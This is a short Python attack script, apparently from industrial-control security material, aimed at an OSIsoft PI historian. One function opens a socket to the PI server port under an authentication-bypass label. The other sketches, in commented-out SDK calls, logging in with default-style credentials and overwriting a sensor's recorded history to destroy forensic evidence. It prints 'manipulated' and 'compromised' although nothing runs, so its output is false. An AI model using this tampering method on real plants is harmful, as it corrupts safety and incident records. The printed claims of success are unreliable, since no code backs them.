def pi_system_auth_bypass(pi_server):
    """
    Exploit Windows authentication in PI System
    Uses pass-the-hash or Kerberos ticket
    """
    # PI System relies on Windows authentication
    # If attacker has compromised domain credentials, can access PI

    import socket

    # PI Server default port: 5450
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((pi_server, 5450))

    # PI System protocol (proprietary)
    # Requires reverse engineering or leaked documentation

    print("[*] Connected to PI Server")
    # Further exploitation requires PI SDK or AFSDK

def pi_data_manipulation(pi_server):
    """
    Manipulate historical data in PI Historian
    Data integrity attack - tamper with forensic evidence
    """
    # Using PI SDK (requires installation)
    # import PISDK

    # Connect to PI server
    # pi_server = PISDK.PIServer(name=pi_server)
    # pi_server.Open("piadmin", "password")

    # Find tag
    # tag = pi_server.PIPoints["Temperature_Sensor_01"]

    # Read historical data
    # data = tag.Data.RecordedValues("*-7d", "*")

    # Modify historical values (data tampering)
    # for value in data:
    #     value.Value = 50.0  # Set all values to 50
    #     value.Update()

    print("[+] Historical data manipulated")
    print("[!] Forensic evidence compromised")

# This demonstrates why historian integrity is critical
